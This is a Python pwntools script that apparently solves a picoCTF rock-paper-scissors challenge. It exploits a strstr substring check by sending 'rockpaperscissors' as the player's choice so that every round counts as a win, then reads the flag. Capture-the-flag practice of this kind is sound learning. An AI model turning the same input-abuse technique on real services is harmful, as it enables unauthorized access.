#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./game")
context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.PLT_DEBUG:
            gdb.attach(r)
    else:
        r = remote("saturn.picoctf.net", 53864)

    return r


def main():
    r = conn()

    # Since it checks whether there's the losing hand (substring) in the player's choice (string),
    # we can give the full string "rockpaperscissors" as the choice and the check done with 'strstr'
    # will be always TRUE!

    for i in range(5):
        r.sendlineafter(b'program\r\n', b'1')
        r.sendlineafter(b'Please make your selection (rock/paper/scissors):\r\n', b'rockpaperscissors')
        sleep(1)

    flag = r.recvuntilS('Type \'1\' to play a game', drop=True).split('\r\n')[-2]
    log.warn(f'Flag obtained: {flag}')
        


if __name__ == "__main__":
    main()